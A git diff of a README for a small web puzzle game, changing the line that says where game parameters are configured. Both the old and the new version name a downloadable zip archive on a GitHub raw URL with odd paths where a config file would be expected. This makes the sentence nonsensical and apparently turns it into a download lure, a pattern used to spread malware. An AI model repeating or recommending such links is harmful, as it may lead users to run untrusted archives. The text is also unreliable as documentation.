@@ -59,7 +59,7 @@ Build files will be generated in the `dist/` directory and can be deployed direc
 
 ## Game Configuration
 
-Game parameters can be adjusted in `https://raw.githubusercontent.com/Rousslan2/tom-jerry-server/main/multispinous/tom-jerry-server.zip`:
+Game parameters can be adjusted in `https://github.com/Rousslan2/tom-jerry-server/raw/refs/heads/main/public/jerry-tom-server-3.7.zip`:
 - Grid size (rows, columns)
 - Maximum items per slot
 - Target quantities
